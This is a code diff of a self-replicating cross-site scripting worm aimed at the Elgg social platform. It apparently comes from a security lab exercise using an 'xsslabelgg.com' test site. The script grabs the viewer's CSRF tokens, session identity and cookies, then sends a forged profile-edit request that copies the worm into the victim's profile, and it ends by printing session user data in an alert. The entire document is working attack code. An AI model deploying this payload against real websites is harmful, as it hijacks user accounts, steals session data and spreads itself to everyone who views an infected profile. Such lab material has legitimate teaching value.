@@ -1,25 +1,22 @@
 <script id="worm">
+window.onload = function () {
 var CODE = document.getElementById("worm").innerHTML;
-alert(CODE);
-var CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
-"&__elgg_ts="+escape(elgg.security.token.__elgg_ts)+
-"&name="+escape(elgg.session.user.name)+
-"&description="+escape("<script>"+CODE+"<\/script>");
-"&guid="+escape(elgg.session.user.guid);
+var CONTENT = "".concat("__elgg_token=", elgg.security.token.__elgg_token,
+"&__elgg_ts=", elgg.security.token.__elgg_ts,
+"&name=", elgg.session.user.name, 
+"&description=", "<script id='worm'>".concat(CODE, "<\/script>"),
+"&guid=", elgg.session.user.guid);
 var Ajax = new XMLHttpRequest();
 Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
 Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
-Ajax.setRequestHeader("Keep-Alive", "300");
-Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0");
-Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
-Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
-Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+escape(elgg.session.user.username)+"/edit");
-Ajax.setRequestHeader("Cookie", "Elgg="+escape(document.cookie));
+Ajax.setRequestHeader("Keep-alive", "300");
+Ajax.setRequestHeader("Cookie", document.cookie);
 Ajax.setRequestHeader("Connection", "keep-alive");
-Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
 Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-Ajax.setRequestHeader("Content-Length", CONTENT.length);
-Ajax.send(CONTENT);
-alert('Done');
+Ajax.send(escape(CONTENT));
+alert("elgg.session.user:".concat(
+JSON.stringify(elgg.session.user),
+"elgg.page_owner:",
+JSON.stringify(elgg.page_owner)));
+};
 </script>
